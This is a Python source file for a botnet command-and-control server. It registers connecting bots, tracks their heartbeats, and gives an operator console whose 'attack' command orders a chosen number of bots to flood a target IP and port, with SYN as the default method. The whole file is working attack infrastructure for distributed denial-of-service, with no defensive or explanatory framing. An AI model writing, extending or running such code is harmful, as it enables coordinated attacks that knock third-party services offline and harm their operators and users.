# cnc_server.py
import socket, threading, time
from datetime import datetime

bots = {}

def client_handler(conn, addr):
    ip = addr[0]
    bots[ip] = {
        "socket": conn,
        "connected_at": datetime.now(),
        "last_heartbeat": datetime.now()
    }
    try:
        while True:
            data = conn.recv(1024).decode()
            if data == "heartbeat":
                bots[ip]["last_heartbeat"] = datetime.now()
            elif data.startswith("hello"):
                continue
            else:
                print(f"Received unknown message: {data}")
    except:
        pass
    finally:
        print(f"[DISCONNECT] {ip}")
        bots.pop(ip, None)
        conn.close()

def heartbeat_checker():
    while True:
        now = datetime.now()
        to_remove = []
        for ip, info in list(bots.items()):
            delta = (now - info["last_heartbeat"]).total_seconds()
            if delta > 10:
                print(f"[TIMEOUT] {ip}")
                to_remove.append(ip)
        for ip in to_remove:
            bots[ip]["socket"].close()
            del bots[ip]
        time.sleep(5)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9001))
    server.listen(100)
    threading.Thread(target=heartbeat_checker, daemon=True).start()
    print("[CNC] Listening on port 9001...")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()

def print_status():
    print("\n[CNC STATUS]")
    for ip, info in bots.items():
        print(f"Bot {ip}, Connected at {info['connected_at']}, Last heartbeat: {info['last_heartbeat']}")
    print(f"Total bots: {len(bots)}\n")

def send_attack(target_ip, target_port, method="syn", count=5):
    selected_bots = list(bots.values())[:count]
    for bot in selected_bots:
        try:
            cmd = f"attack {method} {target_ip} {target_port}"
            bot["socket"].send(cmd.encode())
        except:
            continue

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    while True:
        cmd = input("CNC> ")
        if cmd.startswith("status"):
            print_status()
        elif cmd.startswith("attack"):
            parts = cmd.split()
            if len(parts) != 5:
                print("Usage: attack <method> <target_ip> <target_port> <bot_count>")
                continue
            _, method, ip, port, count = parts
            send_attack(ip, int(port), method, int(count))
        else:
            print("Commands: status | attack <method> <ip> <port> <bot_count>")
